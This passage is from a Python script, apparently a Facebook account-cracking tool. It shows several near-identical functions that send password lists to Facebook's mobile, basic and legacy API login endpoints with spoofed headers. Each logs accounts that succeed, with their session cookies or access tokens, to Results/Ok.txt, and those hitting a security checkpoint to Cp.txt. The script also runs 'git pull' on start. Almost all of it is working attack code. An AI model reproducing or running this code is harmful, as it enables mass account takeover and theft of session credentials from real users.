                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://free.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack Mobile.Facebook.Com
def mobile(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"origin": "https://m.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "m.facebook.com", "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://m.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack D.Facebook.Com
def crack(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"origin": "https://d.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "d.facebook.com", "referer": "https://d.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://d.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://d.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fd.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack B-api.Facebook.com
def api(ids, uid, pwx):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
            if 'session_key' in send.text and 'EAAA' in send.text:
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif 'www.facebook.com' in send.json()['error_msg']:
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack X.Facebook.com
def crack2(ids, uid, pwx, **kwargs):
    global loop, uas, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"origin": "https://x.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "x.facebook.com", "referer": "https://x.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://x.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://x.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fx.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass

if __name__=='__main__':
	os.system("git pull")
	___menu___()
